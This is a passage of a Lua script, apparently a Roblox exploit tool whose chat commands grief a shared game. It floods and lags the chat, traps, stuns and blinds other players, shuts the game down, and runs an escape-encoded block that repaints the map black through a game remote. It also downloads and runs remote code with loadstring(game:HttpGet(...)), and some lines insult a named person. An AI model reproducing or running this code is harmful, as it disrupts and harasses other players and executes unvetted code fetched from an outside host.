				chatt("/super h fordbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ALSO I THINK TECHNO IS GOOD AT SCRIPTING BUT AT THE SAME TIME HE REALLY SUCKS! WHY DOES HE SUCK YOU MAY ASK. WELL HE PREFERED HEARTBEAT OVER TASK WAIT LIKE OMG HOWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW" .. math.random(1, 1000));wait(.65)
				chatt("/lagall " .. math.random(1, 1000));wait(9.7)
				--say("#############fool###########################piss (System) The Chat UI is now back up");wait()
				chatt(prefix.."stop") -- Incase the spam hasn't stopped yet
			end
			if msg:lower() == prefix .. "blackout" then
				rconsoleprint("THIS COMMAND IS BROKEN AND I LOST ITS INITIAL SOURCE CODE")
				game:shutdown()
				chatt("fogcolor 0 0 0")
				chatt("time -");wait()
				chatt("music "..antilog.."1018130283")
				chatt("time 0")
				chatt("gear me "..antilog.."94333296")
				chatt("fogend 500")
				pcall(function()
					loadstring(
						"local\32function\32b\40b\41ChatBar\58SetTextFromInput\40b\41game\46Players\58Chat\40b\41ChatBar\46Text\61\34\34end\59colorAPI\61\123\125colorAPI\46color\61function\40b\44c\41local\32b\61coroutine\46create\40function\40\41local\32b\61\123\91\34Part\34\93\61b\44\91\34Color\34\93\61c\125game\58GetService\40\34Workspace\34\41\91game\58GetService\40\34Players\34\41\46LocalPlayer\46Name\93\46PaintBucket\58WaitForChild\40\34Remotes\34\41\46ServerControls\58InvokeServer\40\34PaintPart\34\44b\41end\41coroutine\46resume\40b\41end\59colorAPI\46transformToColor\51\61function\40b\41local\32c\61b\46r\59local\32d\61b\46g\59local\32b\61b\46b\59return\32Color\51\46new\40c\44d\44b\41end\59colorAPI\46colorObbyBox\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Obby\32Box\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\44b\41end\32end\59colorAPI\46colorObbyBricks\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Obby\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\44b\41end\32end\59colorAPI\46colorAdminDivs\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Admin\32Dividers\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\44b\41end\32end\59colorAPI\46colorPads\61function\40b\41for\32c\44c\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Admin\91\34Pads\34\93\58GetChildren\40\41\41do\32colorAPI\46color\40c\46Head\44b\41end\32end\59colorAPI\46colorHouse\61function\40b\41local\32c\61b\46wallsC\59local\32d\61b\46baseC\59local\32e\61b\46roofC\59local\32f\61b\46WANDDC\59local\32g\61b\46stairsC\59local\32h\61b\46floorC\59local\32i\61b\46rooftsC\59local\32b\61b\46chiC\59for\32j\44j\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Basic\32House\34\93\58GetChildren\40\41\41do\32coroutine\46wrap\40function\40\41if\32j\46Name\61\61\34SmoothBlockModel\49\48\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\55\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\57\34or\32j\46Name\61\61\34SmoothBlockModel\51\48\34or\32j\46Name\61\61\34SmoothBlockModel\51\49\34or\32j\46Name\61\61\34SmoothBlockModel\51\54\34or\32j\46Name\61\61\34SmoothBlockModel\51\55\34or\32j\46Name\61\61\34SmoothBlockModel\51\56\34or\32j\46Name\61\61\34SmoothBlockModel\51\57\34or\32j\46Name\61\61\34SmoothBlockModel\52\49\34or\32j\46Name\61\61\34SmoothBlockModel\52\56\34or\32j\46Name\61\61\34SmoothBlockModel\52\57\34or\32j\46Name\61\61\34SmoothBlockModel\53\49\34or\32j\46Name\61\61\34SmoothBlockModel\53\54\34or\32j\46Name\61\61\34SmoothBlockModel\54\55\34or\32j\46Name\61\61\34SmoothBlockModel\54\56\34or\32j\46Name\61\61\34SmoothBlockModel\54\57\34or\32j\46Name\61\61\34SmoothBlockModel\55\48\34or\32j\46Name\61\61\34SmoothBlockModel\55\50\34or\32j\46Name\61\61\34SmoothBlockModel\55\53\34or\32j\46Name\61\61\34SmoothBlockModel\56\34or\32j\46Name\61\61\34SmoothBlockModel\56\49\34or\32j\46Name\61\61\34SmoothBlockModel\56\53\34or\32j\46Name\61\61\34SmoothBlockModel\57\51\34or\32j\46Name\61\61\34SmoothBlockModel\57\56\34then\32colorAPI\46color\40j\44c\41end\59if\32j\46Name\61\61\34SmoothBlockModel\52\48\34then\32colorAPI\46color\40j\44d\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\48\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\51\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\55\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\51\34or\32j\46Name\61\61\34SmoothBlockModel\50\51\48\34or\32j\46Name\61\61\34SmoothBlockModel\50\51\49\34or\32j\46Name\61\61\34SmoothBlockModel\50\53\34or\32j\46Name\61\61\34SmoothBlockModel\50\56\34or\32j\46Name\61\61\34SmoothBlockModel\51\50\34or\32j\46Name\61\61\34SmoothBlockModel\51\51\34or\32j\46Name\61\61\34SmoothBlockModel\51\52\34or\32j\46Name\61\61\34SmoothBlockModel\52\50\34or\32j\46Name\61\61\34SmoothBlockModel\52\52\34or\32j\46Name\61\61\34SmoothBlockModel\52\55\34or\32j\46Name\61\61\34SmoothBlockModel\53\52\34or\32j\46Name\61\61\34SmoothBlockModel\53\53\34or\32j\46Name\61\61\34SmoothBlockModel\53\56\34or\32j\46Name\61\61\34SmoothBlockModel\53\57\34or\32j\46Name\61\61\34SmoothBlockModel\54\34or\32j\46Name\61\61\34SmoothBlockModel\54\49\34or\32j\46Name\61\61\34SmoothBlockModel\54\50\34or\32j\46Name\61\61\34SmoothBlockModel\54\51\34or\32j\46Name\61\61\34SmoothBlockModel\55\52\34or\32j\46Name\61\61\34SmoothBlockModel\55\54\34or\32j\46Name\61\61\34SmoothBlockModel\55\55\34or\32j\46Name\61\61\34SmoothBlockModel\55\56\34or\32j\46Name\61\61\34SmoothBlockModel\55\57\34or\32j\46Name\61\61\34SmoothBlockModel\56\48\34or\32j\46Name\61\61\34SmoothBlockModel\56\52\34or\32j\46Name\61\61\34SmoothBlockModel\56\54\34or\32j\46Name\61\61\34SmoothBlockModel\56\55\34or\32j\46Name\61\61\34SmoothBlockModel\56\56\34or\32j\46Name\61\61\34SmoothBlockModel\57\48\34or\32j\46Name\61\61\34SmoothBlockModel\57\49\34or\32j\46Name\61\61\34SmoothBlockModel\57\50\34or\32j\46Name\61\61\34SmoothBlockModel\57\52\34or\32j\46Name\61\61\34SmoothBlockModel\57\53\34or\32j\46Name\61\61\34SmoothBlockModel\57\54\34then\32colorAPI\46color\40j\44e\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\48\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\49\55\34or\32j\46Name\61\61\34SmoothBlockModel\49\50\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\54\34or\32j\46Name\61\61\34SmoothBlockModel\49\52\56\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\53\57\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\49\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\56\51\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\52\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\57\57\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\48\54\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\50\34or\32j\46Name\61\61\34SmoothBlockModel\50\49\55\34or\32j\46Name\61\61\34SmoothBlockModel\50\50\56\34or\32j\46Name\61\61\34SmoothBlockModel\50\52\34or\32j\46Name\61\61\34SmoothBlockModel\50\55\34or\32j\46Name\61\61\34SmoothBlockModel\51\53\34or\32j\46Name\61\61\34SmoothBlockModel\52\34or\32j\46Name\61\61\34SmoothBlockModel\52\51\34or\32j\46Name\61\61\34SmoothBlockModel\52\53\34or\32j\46Name\61\61\34SmoothBlockModel\52\54\34or\32j\46Name\61\61\34SmoothBlockModel\53\48\34or\32j\46Name\61\61\34SmoothBlockModel\53\51\34or\32j\46Name\61\61\34SmoothBlockModel\53\55\34or\32j\46Name\61\61\34SmoothBlockModel\54\48\34or\32j\46Name\61\61\34SmoothBlockModel\54\52\34or\32j\46Name\61\61\34SmoothBlockModel\54\53\34or\32j\46Name\61\61\34SmoothBlockModel\54\54\34or\32j\46Name\61\61\34SmoothBlockModel\55\34or\32j\46Name\61\61\34SmoothBlockModel\55\49\34or\32j\46Name\61\61\34SmoothBlockModel\55\51\34or\32j\46Name\61\61\34SmoothBlockModel\56\50\34or\32j\46Name\61\61\34SmoothBlockModel\56\51\34or\32j\46Name\61\61\34SmoothBlockModel\56\57\34or\32j\46Name\61\61\34SmoothBlockModel\57\57\34then\32colorAPI\46color\40j\44f\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\34or\32j\46Name\61\61\34SmoothBlockModel\51\34or\32j\46Name\61\61\34SmoothBlockModel\53\34or\32j\46Name\61\61\34SmoothBlockModel\57\34then\32colorAPI\46color\40j\44g\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\49\50\34then\32colorAPI\46color\40j\44h\41end\59if\32j\46Name\61\61\34SmoothBlockModel\53\50\34or\32j\46Name\61\61\34SmoothBlockModel\57\55\34then\32colorAPI\46color\40j\44i\41end\59if\32j\46Name\61\61\34SmoothBlockModel\49\54\48\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\50\34or\32j\46Name\61\61\34SmoothBlockModel\49\54\53\34or\32j\46Name\61\61\34SmoothBlockModel\49\55\56\34then\32colorAPI\46color\40j\44b\41end\32end\41\40\41end\32end\59colorAPI\46colorBuildingBricks\61function\40b\41local\32c\61b\46DarkStoneGrey\59local\32d\61b\46DeepBlue\59local\32e\61b\46NY\59local\32f\61b\46IW\59local\32g\61b\46LimeGreen\59local\32h\61b\46MSG\59local\32i\61b\46RB\59local\32j\61b\46RR\59local\32b\61b\46TP\59for\32k\44k\32in\32pairs\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Building\32Bricks\34\93\58GetChildren\40\41\41do\32coroutine\46wrap\40function\40\41if\32k\46Name\61\61\34Part\50\57\34or\32k\46Name\61\61\34Part\51\49\34or\32k\46Name\61\61\34Part\53\53\34then\32colorAPI\46color\40k\44c\41end\59if\32k\46Name\61\61\34Part\49\49\34or\32k\46Name\61\61\34Part\49\56\34or\32k\46Name\61\61\34Part\50\53\34or\32k\46Name\61\61\34Part\51\34or\32k\46Name\61\61\34Part\52\51\34then\32colorAPI\46color\40k\44d\41end\59if\32k\46Name\61\61\34Part\49\50\34or\32k\46Name\61\61\34Part\49\53\34or\32k\46Name\61\61\34Part\50\52\34or\32k\46Name\61\61\34Part\52\52\34or\32k\46Name\61\61\34Part\54\34then\32colorAPI\46color\40k\44e\41end\59if\32k\46Name\61\61\34Part\49\51\34or\32k\46Name\61\61\34Part\50\49\34or\32k\46Name\61\61\34Part\50\51\34or\32k\46Name\61\61\34Part\55\34then\32colorAPI\46color\40k\44f\41end\59if\32k\46Name\61\61\34Part\49\55\34or\32k\46Name\61\61\34Part\50\54\34or\32k\46Name\61\61\34Part\51\56\34or\32k\46Name\61\61\34Part\57\34or\32k\46Name\61\61\34Part\53\34then\32colorAPI\46color\40k\44g\41end\59if\32k\46Name\61\61\34Part\51\48\34or\32k\46Name\61\61\34Part\51\50\34or\32k\46Name\61\61\34Part\51\51\34or\32k\46Name\61\61\34Part\51\52\34or\32k\46Name\61\61\34Part\51\53\34or\32k\46Name\61\61\34Part\51\54\34or\32k\46Name\61\61\34Part\51\57\34or\32k\46Name\61\61\34Part\52\48\34or\32k\46Name\61\61\34Part\52\49\34or\32k\46Name\61\61\34Part\52\50\34or\32k\46Name\61\61\34Part\52\54\34or\32k\46Name\61\61\34Part\52\55\34or\32k\46Name\61\61\34Part\52\56\34or\32k\46Name\61\61\34Part\52\57\34or\32k\46Name\61\61\34Part\53\48\34or\32k\46Name\61\61\34Part\53\49\34or\32k\46Name\61\61\34Part\53\50\34or\32k\46Name\61\61\34Part\53\51\34or\32k\46Name\61\61\34Part\53\52\34or\32k\46Name\61\61\34Part\53\54\34or\32k\46Name\61\61\34Part\53\55\34or\32k\46Name\61\61\34Part\53\56\34or\32k\46Name\61\61\34Part\53\57\34or\32k\46Name\61\61\34Part\54\48\34or\32k\46Name\61\61\34Part\54\49\34then\32colorAPI\46color\40k\44h\41end\59if\32k\46Name\61\61\34Part\49\52\34or\32k\46Name\61\61\34Part\49\57\34or\32k\46Name\61\61\34Part\50\34or\32k\46Name\61\61\34Part\50\55\34then\32colorAPI\46color\40k\44i\41end\59if\32k\46Name\61\61\34Part\49\34or\32k\46Name\61\61\34Part\49\48\34or\32k\46Name\61\61\34Part\49\54\34or\32k\46Name\61\61\34Part\50\50\34or\32k\46Name\61\61\34Part\51\55\34then\32colorAPI\46color\40k\44j\41end\59if\32k\46Name\61\61\34Part\50\48\34or\32k\46Name\61\61\34Part\50\56\34or\32k\46Name\61\61\34Part\52\34or\32k\46Name\61\61\34Part\52\53\34or\32k\46Name\61\61\34Part\56\34then\32colorAPI\46color\40k\44b\41end\32end\41\40\41end\32end\59b\40\34gear\32me\32\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\49\56\52\55\52\52\53\57\34\41wait\40\49\41game\46Players\46LocalPlayer\46Character\46Humanoid\58EquipTool\40game\46Players\46LocalPlayer\46Backpack\46PaintBucket\41wait\40\48\46\53\48\41coroutine\46wrap\40function\40\41colorAPI\46colorHouse\40\123wallsC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44baseC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44roofC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44WANDDC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44stairsC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44floorC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44rooftsC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44chiC\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\125\41end\41\40\41spawn\40function\40\41colorAPI\46colorBuildingBricks\40\123DarkStoneGrey\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44DeepBlue\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44NY\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44IW\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44LimeGreen\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44MSG\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44RB\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44TP\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\44RR\61colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\125\41end\41colorAPI\46color\40game\46Workspace\46Terrain\91\34\95Game\34\93\46Workspace\91\34Baseplate\34\93\44colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41spawn\40function\40\41colorAPI\46colorObbyBox\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41spawn\40function\40\41colorAPI\46colorObbyBricks\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41spawn\40function\40\41colorAPI\46colorAdminDivs\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41spawn\40function\40\41colorAPI\46colorPads\40colorAPI\46transformToColor\51\40BrickColor\46new\40\34Really\32black\34\41\41\41end\41wait\40\48\46\54\41b\40\34ungear\32\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\48\32me\32\34\46\46math\46random\40\57\57\57\57\57\41\41\10"
					)()
				end)
				chatt("music")
			end

			-- Outdated

			if msg:lower() == prefix .. "effex" then
				chatt(prefix.."infyield");wait()
				chatt(prefix.."savebuildstuff");wait(.85)
				execCmd("f3x");wait(.35)
				execCmd("unlockws")
				execCmd("noclipcam")
				setclipboard("https://github.com/Tech-187/Lua-scripts/blob/main/F3X%20archived")
			end

			-- Outdated

			if msg:lower() == prefix .. "removewater" then
				chatt(prefix.."infyield");wait(.65)
				chatt(prefix.."spam gear me "..antilog.."88146497");wait(5)
				chatt("/super gear me "..antilog.."88146497");wait(1.65)
				execCmd("noclipcam")
				chatt(prefix.."stop")
				execCmd("usetools 250 0.033")
				logn("Uses 250 bombs.")
			end
			if msg:lower() == prefix .. "savebuildstuff" then
				loadstring(game:HttpGet(('https://raw.githubusercontent.com/SCtestv4r14nt/scr4bl33/main/http_'),true))()
				-- This is funzy's save/build script.
			end
			if msg:lower() == prefix .. "scramble" then
				chatt("blind all")
				chatt("music 6823378863")
				chatt(prefix.."temploopgrab")
				chatt("/trap others");wait()
				chatt("stun others");wait(.5)
				chatt("noclip others")
				chatt(
        [[h  

























_______________________________________


__________________________
__________________________

Scrambling the signals

__________________________

Please wait

_________________________________
__________________________

]]
				);wait()
				say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
				say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
				say("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻");wait(5)
				chatt(prefix.."untemploopgrab")
				chatt("clr");wait()
